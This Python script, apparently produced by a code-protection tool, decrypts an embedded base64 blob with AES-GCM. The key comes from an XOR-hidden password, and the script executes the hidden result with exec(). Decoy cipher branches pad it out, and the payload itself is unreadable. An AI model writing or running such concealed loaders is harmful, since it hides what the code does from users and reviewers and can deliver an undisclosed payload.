#!/usr/bin/env python3
def _kmfy(_vwju):
    return _vwju % 3763 + 1

import hashlib as _woi, hmac as _lotyxp, base64 as _decwyjt, sys as _mlqjd, zlib as _bihlzkh
_vwju = 676403
_upb = """OMOHswL58Gi9OKaC0PuEp68Nhma+e8GmsDbrXZducoAKh1bH1s325bxEc+uhYIV4Sz+g2a3r1ijwkoehgf2teZa+AD6t8YpO3ufTZKMS453oqspHAQhAY00IIz+G0Nj6ph96kRzGKPp//FFk904Ck22LZGCeTON7dZ9wGTBZALBlYKqmBJk1Trl6HbHYuXFuO1oJp1MUD+1PM4ZR2n9Srb5S09YymgS9dAH+UeviOig2jUheGPJvUbGBbHbRk4zgpXgdqXNjA+W4npLzGhrGX1h1mJQfHAA6VleaECcp1eKHk0OOh5jI+GEpja7ACGP5qL9H0mfmbDgmOcb6+TX0GSdsLBRP1rHdJ0ZOYwWOPTAy9HzLIkowBv016Z4njTceg+xx+0+ohGcMB2kWH1o+1k74QHPvkW4oS881lx/uDtr/WTp+Q3as3N7FB1PuyvhNMpep27SvHOGGKdua4xypmPiHphtXPprM++Eo0eUm2PDz27qj13GEpb3ugc/CALz2zraCKySl1bY7CwFRhWosE1cJMVGDs0IbBZYwIcct+INThSAtWa/ZdOx192oxpf64T5H6IlFFqgb6+7I1lufbe9YjdbeZJ2u9fMAlHdlKXlgOvA676D66sRD9cfpPvYt9H7AnLE0nkuDHre4hGxHgBPlBuLYFou6wd29j7I91cN2TTmGJby+GUPb1cVtNhFxqB0+rb4NEF51pOwWXvdX4/FzDRDTaIRVI1n1wO8mBI1Sq+CCKo2YuB6uJhHvorh5gVeEnpTD7lSiWt8sSemO9SJpuZyuUslkZgEnmYYrs3XVZoAV7R3FZKktrKpamYgj33HOEpJYv9uBt5N0w08/P8GfYZ0EjEQ4LUZrqR8fPZmLCjX4r3JRzl5Z/IC7CnBmk6cHGkL7JsocUyu7P9Rkwt1EfjXepqoz4xIqrUuopTi2NoEppFf0w/s4R+ttWXnnXszFVEavl6d5chPwotl2x9Fu5bzObm2TFlXJt/BQUDD7AMf0BsBNwVQ=="""
_ibfx = 3
_ivd = _kmfy(_vwju)
def _of():
    _idgh = bytes.fromhex("a2b4b2a3b4a58ebab4a8")
    _idgh = bytes(_ ^ 209 for _ in _idgh).decode()
    _qcm = _decwyjt.b64decode(_upb)
    if _ibfx == 11:
        _tiq = _qcm[:16]; _ar = _qcm[-32:]; _rbbdjq = _qcm[16:-32]
        _ltok = _woi.pbkdf2_hmac('sha256', _idgh.encode(), _tiq, 100000, dklen=64)
        _yqchtuk = _ltok[:32]; _xpgas = _ltok[32:64]
        _rsukzfd = _lotyxp.new(_xpgas, _rbbdjq, _woi.sha256).digest()
        if not _lotyxp.compare_digest(_ar, _rsukzfd):
            _mlqjd.stderr.write("error: integrity check failed\n"); _mlqjd.exit(1)
        _yqcxv = _yqchtuk[0]
        _hjb = bytearray()
        for _vreys in range(len(_rbbdjq)):
            _tiq = _rbbdjq[_vreys] ^ _yqcxv
            _hjb.append(_tiq)
            _yqcxv = _rbbdjq[_vreys] ^ _yqchtuk[ (_vreys + 1) % len(_yqchtuk) ]
            _yqcxv = (((_yqcxv << 3) & 0xFF) | (_yqcxv >> 5)) ^ 0x5A
        _hjb = bytes(_hjb)
    elif _ibfx == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _hxtz, algorithms as _eay, modes as _rnk
        except ImportError:
            _mlqjd.stderr.write("error: cryptography not installed\n"); _mlqjd.exit(1)
        _tiq = _qcm[:16]; _ar = _qcm[-32:]; _rbbdjq = _qcm[16:-32]
        _ltok = _woi.pbkdf2_hmac('sha256', _idgh.encode(), _tiq, 100000, dklen=64)
        _yqchtuk = _ltok[:32]; _xpgas = _ltok[32:64]
        _rsukzfd = _lotyxp.new(_xpgas, _rbbdjq, _woi.sha256).digest()
        if not _lotyxp.compare_digest(_ar, _rsukzfd):
            _mlqjd.stderr.write("error: integrity check failed\n"); _mlqjd.exit(1)
        _pbnffxb = _hxtz(_eay.AES(_yqchtuk), _rnk.ECB())
        _hjb = _pbnffxb.decryptor()
        _hjb = _hjb.update(_rbbdjq) + _hjb.finalize()
        _yqcxv = _hjb[-1]
        if _yqcxv < 1 or _yqcxv > 16 or not all(_ == _yqcxv for _ in _hjb[-_yqcxv:]):
            _mlqjd.stderr.write("error: decryption failed\n"); _mlqjd.exit(1)
        _hjb = _hjb[:-_yqcxv]
    elif _ibfx == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _hxtz, algorithms as _eay, modes as _rnk
        except ImportError:
            _mlqjd.stderr.write("error: cryptography not installed\n"); _mlqjd.exit(1)
        _tiq = _qcm[:16]; _ar = _qcm[-32:]; _rbbdjq = _qcm[16:-32]
        _ltok = _woi.pbkdf2_hmac('sha256', _idgh.encode(), _tiq, 100000, dklen=80)
        _yqchtuk = _ltok[:32]; _aanptx = _ltok[32:48]; _xpgas = _ltok[48:80]
        _rsukzfd = _lotyxp.new(_xpgas, _rbbdjq, _woi.sha256).digest()
        if not _lotyxp.compare_digest(_ar, _rsukzfd):
            _mlqjd.stderr.write("error: integrity check failed\n"); _mlqjd.exit(1)
        _pbnffxb = _hxtz(_eay.AES(_yqchtuk), _rnk.CTR(_aanptx))
        _hjb = _pbnffxb.decryptor().update(_rbbdjq)
    elif _ibfx == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _hxtz, algorithms as _eay, modes as _rnk
        except ImportError:
            _mlqjd.stderr.write("error: cryptography not installed\n"); _mlqjd.exit(1)
        _tiq = _qcm[:16]; _ar = _qcm[-32:]; _rbbdjq = _qcm[16:-32]
        _ltok = _woi.pbkdf2_hmac('sha256', _idgh.encode(), _tiq, 100000, dklen=80)
        _yqchtuk = _ltok[:32]; _aanptx = _ltok[32:48]; _xpgas = _ltok[48:80]
        _rsukzfd = _lotyxp.new(_xpgas, _rbbdjq, _woi.sha256).digest()
        if not _lotyxp.compare_digest(_ar, _rsukzfd):
            _mlqjd.stderr.write("error: integrity check failed\n"); _mlqjd.exit(1)
        _pbnffxb = _hxtz(_eay.AES(_yqchtuk), _rnk.CBC(_aanptx))
        _hjb = _pbnffxb.decryptor()
        _hjb = _hjb.update(_rbbdjq) + _hjb.finalize()
        _yqcxv = _hjb[-1]
        if _yqcxv < 1 or _yqcxv > 16 or not all(_ == _yqcxv for _ in _hjb[-_yqcxv:]):
            _mlqjd.stderr.write("error: decryption failed\n"); _mlqjd.exit(1)
        _hjb = _hjb[:-_yqcxv]
    elif _ibfx == 10:
        _hjb = bytes.fromhex(_qcm.decode('ascii'))
    elif _ibfx == 7:
        _hjb = _decwyjt.b32decode(_qcm)
    elif _ibfx == 9:
        def _dbfql(_nhdhlxd):
            if _nhdhlxd[:2] == b'<~': _nhdhlxd = _nhdhlxd[2:]
            if _nhdhlxd[-2:] == b'~>': _nhdhlxd = _nhdhlxd[:-2]
            _zbephq = bytearray(); _ni = 0
            while _ni < len(_nhdhlxd):
                if _nhdhlxd[_ni] == 122:
                    _zbephq.extend(b'\x00\x00\x00\x00'); _ni += 1; continue
                _bfm = 0; _ecri = 0
                while _ni < len(_nhdhlxd) and _ecri < 5:
                    _bfm = _bfm * 85 + (_nhdhlxd[_ni] - 33); _ni += 1; _ecri += 1
                _wyprn = _ecri - 1
                if _wyprn > 0: _zbephq.extend(_bfm.to_bytes(4, 'big')[4-_wyprn:])
            return bytes(_zbephq)
        _hjb = _dbfql(_qcm)
    elif _ibfx == 5:
        _tiq = _qcm[:16]; _ar = _qcm[-32:]; _rbbdjq = _qcm[16:-32]
        _ltok = _woi.pbkdf2_hmac('sha256', _idgh.encode(), _tiq, 100000, dklen=64)
        _yqchtuk = _ltok[:32]; _xpgas = _ltok[32:64]
        _rsukzfd = _lotyxp.new(_xpgas, _rbbdjq, _woi.sha256).digest()
        if not _lotyxp.compare_digest(_ar, _rsukzfd):
            _mlqjd.stderr.write("error: integrity check failed\n"); _mlqjd.exit(1)
        _hjb = bytes(_rbbdjq[i] ^ _yqchtuk[i % 32] for i in range(len(_rbbdjq)))
    elif _ibfx == 6:
        _hjb = _decwyjt.b64decode(_qcm)
    elif _ibfx == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _hxtz, algorithms as _eay, modes as _rnk
        except ImportError:
            _mlqjd.stderr.write("error: cryptography not installed\n"); _mlqjd.exit(1)
        _tiq = _qcm[:16]; _ar = _qcm[-32:]; _rbbdjq = _qcm[16:-32]
        _ltok = _woi.pbkdf2_hmac('sha256', _idgh.encode(), _tiq, 100000, dklen=80)
        _yqchtuk = _ltok[:32]; _aanptx = _ltok[32:48]; _xpgas = _ltok[48:80]
        _rsukzfd = _lotyxp.new(_xpgas, _rbbdjq, _woi.sha256).digest()
        if not _lotyxp.compare_digest(_ar, _rsukzfd):
            _mlqjd.stderr.write("error: integrity check failed\n"); _mlqjd.exit(1)
        _pbnffxb = _hxtz(_eay.ChaCha20(_yqchtuk, _aanptx), mode=None)
        _hjb = _pbnffxb.decryptor().update(_rbbdjq)
    elif _ibfx == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _md
        except ImportError:
            _mlqjd.stderr.write("error: cryptography not installed\n"); _mlqjd.exit(1)
        _tiq = _qcm[:16]; _ar = _qcm[-32:]; _hjb = _qcm[16:-32]
        _rbbdjq = _hjb[:-16]; _yqcxv = _hjb[-16:]
        _ltok = _woi.pbkdf2_hmac('sha256', _idgh.encode(), _tiq, 100000, dklen=76)
        _yqchtuk = _ltok[:32]; _aanptx = _ltok[32:44]; _xpgas = _ltok[44:76]
        _rsukzfd = _lotyxp.new(_xpgas, _hjb, _woi.sha256).digest()
        if not _lotyxp.compare_digest(_ar, _rsukzfd):
            _mlqjd.stderr.write("error: integrity check failed\n"); _mlqjd.exit(1)
        _hjb = _md(_yqchtuk).decrypt(_aanptx, _rbbdjq + _yqcxv, None)
    elif _ibfx == 8:
        _jtw = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _jaggcvm = {c:i for i,c in enumerate(_jtw)}
        def _eja(_aggyqxn):
            _gkwkko = bytearray(); _tit = 0
            while _tit < len(_aggyqxn):
                _tulc = 0; _godkxg = 0
                while _tit < len(_aggyqxn) and _godkxg < 5:
                    _tulc = _tulc * 85 + _jaggcvm[chr(_aggyqxn[_tit])]; _tit += 1; _godkxg += 1
                _zmxzexo = _godkxg - 1
                if _zmxzexo > 0: _gkwkko.extend(_tulc.to_bytes(4, 'big')[4-_zmxzexo:])
            return bytes(_gkwkko)
        _hjb = _eja(_qcm)
    else:
        _mlqjd.stderr.write("error: unsupported algorithm\n"); _mlqjd.exit(1)
    if _hjb[1] == 1:
        import zlib as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    elif _hjb[1] == 2:
        import lzma as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    elif _hjb[1] == 3:
        import bz2 as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    elif _hjb[1] == 4:
        import brotli as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    elif _hjb[1] == 6:
        import gzip as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    elif _hjb[1] == 7:
        import lz4.frame as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    elif _hjb[1] == 8:
        import snappy as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    elif _hjb[1] == 9:
        import gzip as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    elif _hjb[1] == 10:
        import blosc as _bihlzkh
        _hjb = _bihlzkh.decompress(_hjb[4:])
    else:
        _hjb = _hjb[4:]
    exec(compile(_hjb, '<protected>', 'exec'), globals())

if __name__ == '__main__':
    _of()
